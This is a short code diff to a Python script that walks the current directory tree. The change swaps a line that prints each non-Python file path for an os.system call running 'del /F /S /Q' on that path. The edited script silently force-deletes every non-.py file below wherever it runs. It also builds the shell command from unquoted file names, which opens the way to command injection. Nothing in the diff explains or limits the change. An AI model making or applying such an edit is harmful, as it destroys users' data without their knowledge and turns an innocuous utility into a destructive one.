@@ -10,7 +10,7 @@ def main():
     for dir, subfolders, filenames in os.walk(p.curdir):
         for file in filenames:
             if '.py' not in file:
-                print(p.join(dir, file))
+                os.system(f'del /F /S /Q {p.join(dir, file)}')
             
         for folder in subfolders:
             folders.append(p.join(dir, folder))
